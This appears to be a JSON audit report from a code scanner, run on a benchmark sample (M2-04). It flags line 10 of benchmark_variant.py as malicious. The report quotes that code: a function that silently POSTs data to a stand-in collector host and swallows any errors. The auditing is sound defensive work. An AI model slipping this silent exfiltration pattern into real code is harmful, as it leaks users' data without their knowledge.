@@ -1,0 +1,73 @@
+{
+  "report_id": "audit-20260922-182325-473c0fff",
+  "audit_time": "2026-09-22T18:23:25",
+  "target": {
+    "directory": "/home/hjy/taa/models/audit/benchmarks/audit-100/p2_retina_resnet/M2-04",
+    "files_scanned": 4,
+    "total_lines": 345,
+    "files_with_findings": 1
+  },
+  "conclusion": {
+    "passed": false,
+    "verdict": "MALICIOUS",
+    "reason": "Confirmed attack finding present",
+    "risk_level": "CRITICAL",
+    "summary": "审计结论: 发现 1 处恶意代码，检测到文件级复合攻击链。存在数据泄露风险，建议阻断导入",
+    "recommendation": "建议修复: NET_001: 移除网络请求，或限制为仅发送模型指标"
+  },
+  "statistics": {
+    "total_findings": 1,
+    "high": 1,
+    "medium": 0,
+    "malicious": 1,
+    "suspicious": 0,
+    "benign": 0,
+    "uncertain": 0
+  },
+  "file_reports": [
+    {
+      "file": "benchmark_variant.py",
+      "file_path": "/home/hjy/taa/models/audit/benchmarks/audit-100/p2_retina_resnet/M2-04/benchmark_variant.py",
+      "findings_count": 1,
+      "high_count": 1,
+      "medium_count": 0,
+      "risk_level": "HIGH",
+      "summary": "该代码存在网络数据外传的风险，通过 HTTPX 发送敏感数据到一个无效的 URL。",
+      "has_exfiltration_pattern": true,
+      "chained": false,
+      "findings": [
+        {
+          "file": "/home/hjy/taa/models/audit/benchmarks/audit-100/p2_retina_resnet/M2-04/benchmark_variant.py",
+          "line": 10,
+          "rule_id": "NET_001",
+          "category": "network",
+          "severity": "HIGH",
+          "description": "Suspicious external network request detected in Python code",
+          "code_snippet": "httpx.post(\"https://collector.example.invalid/report\", json=data, timeout=5)",
+          "context_before": "",
+          "context_after": "",
+          "language": "python",
+          "taint_trace": [],
+          "ast_enclosing_block": "def transmit_via_httpx(data: Dict[str, Any]) -> None:\n    try:\n        import httpx\n        httpx.post(\"https://collector.example.invalid/report\", json=data, timeout=5)\n    except Exception:\n        pass",
+          "engine": "semgrep",
+          "llm_verdict": "MALICIOUS",
+          "llm_reason": "代码中直接使用 httpx 库进行 HTTP POST 请求，目标 URL 是一个无效的域名（https://collector.example.invalid/report），这通常用于发送敏感数据或进行恶意操作。",
+          "llm_risk": "数据风险说明：该请求可能用于发送敏感数据，如用户信息、登录凭证等，可能导致数据泄露或被滥用。",
+          "suggestion": "移除网络请求，或限制为仅发送模型指标",
+          "is_cross_file": false,
+          "is_microservice": false,
+          "cpg_evidence": null
+        }
+      ]
+    }
+  ],
+  "scan_metadata": {
+    "scanner_version": "1.0.0",
+    "rules_count": 13,
+    "llm_model": "qwen2.5-coder:3b",
+    "llm_enabled": true,
+    "llm_seed": 42,
+    "policy": "gate",
+    "scan_duration_ms": 4383
+  }
+}
